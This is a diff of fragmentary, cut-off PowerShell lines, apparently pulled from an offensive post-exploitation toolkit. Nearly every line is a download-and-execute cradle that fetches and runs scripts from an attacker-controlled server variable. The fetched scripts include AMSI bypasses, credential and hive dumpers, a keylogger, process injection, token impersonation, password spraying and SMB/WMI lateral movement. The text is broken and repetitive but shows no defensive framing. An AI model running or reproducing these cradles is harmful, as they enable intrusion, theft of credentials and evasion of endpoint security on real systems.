@@ -1,0 +1,49 @@
+ if(`$?){del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1
+"				""$($global:ServerURL)/Ask4Creds.ps1"
+"				""$($global:ServerURL)/Ferrari.ps1"
+"				""$($global:ServerURL)/Find-LocalAdminAccess.ps1"
+"				""$($global:ServerURL)/HiveDump.ps1"
+"				""$($global:ServerURL)/Invoke-GrabTheHash.ps1"
+"				""$($global:ServerURL)/Invoke-Patamenia.ps1"
+"				""$($global:ServerURL)/Invoke-SMBRemoting.ps1"
+"				""$($global:ServerURL)/Invoke-SessionHunter.ps1"
+"				""$($global:ServerURL)/Invoke-WMIRemoting.ps1"
+"				""$($global:ServerURL)/NETAMSI.ps1"
+"				""$($global:ServerURL)/PInject.ps1"
+"				""$($global:ServerURL)/SimpleAMSI.ps1"
+"				""$($global:ServerURL)/Suntour.ps1"
+"				""$($global:ServerURL)/TGT_Monitor.ps1"
+"				""$($global:ServerURL)/Tkn_Access_Check.ps1"
+"				""$($global:ServerURL)/Token-Impersonation.ps1"
+"				""$($global:ServerURL)/cms.ps1"
+"				""$($global:ServerURL)/dumper.ps1"
+"				""$($global:ServerURL)/klg.ps1"
+"				""$($global:ServerURL)/pwv.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-Patamenia.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Suntour.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/cms.ps1"
+"			""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/pwv.ps1"
+"			$rawCommand = ""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1"
+"			$rawCommand = ""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1"
+"			$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ask4Creds.ps1"
+"			$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1"
+"			$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PassSpray.ps1"
+"			$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1"
+"$sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SMBRemoting.ps1"
+".WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1"
+"sw.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Token-Impersonation.ps1"
+"w.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1"
+"w.WriteLine(""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1"
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Tkn_Access_Check.ps1
+');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1
+lKerberos';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/dumper.ps1
+ub.com/tmenochet/PowerDump';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Dpapi.ps1
+werDump';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/HiveDump.ps1
